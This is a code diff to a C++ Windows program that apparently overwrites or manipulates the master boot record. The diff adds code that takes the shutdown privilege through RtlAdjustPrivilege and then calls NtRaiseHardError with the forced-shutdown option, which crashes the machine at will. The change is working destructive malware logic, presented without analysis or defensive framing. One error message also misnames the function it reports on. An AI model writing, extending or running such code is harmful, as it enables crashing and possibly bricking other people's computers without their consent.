@@ -20,10 +20,6 @@
 #define STAGE2_START_SECTOR 1
 #define BACKUP_MBR_SECTOR 63
 
-#ifndef STATUS_NOT_IMPLEMENTED
-#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)
-#endif
-
 typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
     NTSTATUS,
     ULONG,
@@ -31,6 +27,13 @@ typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
     PULONG_PTR,
     ULONG,
     PULONG
+);
+
+typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
+    ULONG,
+    BOOLEAN,
+    BOOLEAN,
+    PBOOLEAN
 );
 
 struct stDriveInfo
@@ -816,7 +819,14 @@ int _tmain(int argc, char *argv[])
 
             // Hell Yeahhhhhhh!
             HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+            auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
             auto NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
+
+            if (!RtlAdjustPrivilege)
+            {
+                std::cout << "Failed to get export address of NtlAdjustPrivilege!" << std::endl;
+                return 1;
+            }
 
             if (!NtRaiseHardError)
             {
@@ -825,7 +835,17 @@ int _tmain(int argc, char *argv[])
             }
 
             ULONG response = 0;
-            NTSTATUS status = NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, nullptr, 0, &response);
+            BOOLEAN enabled;
+            NTSTATUS status;
+
+            status = RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
+            if (status != 0)
+            {
+                std::cout << "RtlAdjustPrivilege failed: 0x" << std::hex << status << std::endl;
+                return 1;
+            }
+
+            status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);
 
             std::cout << "Status: " << std::hex << status << std::endl;
         }
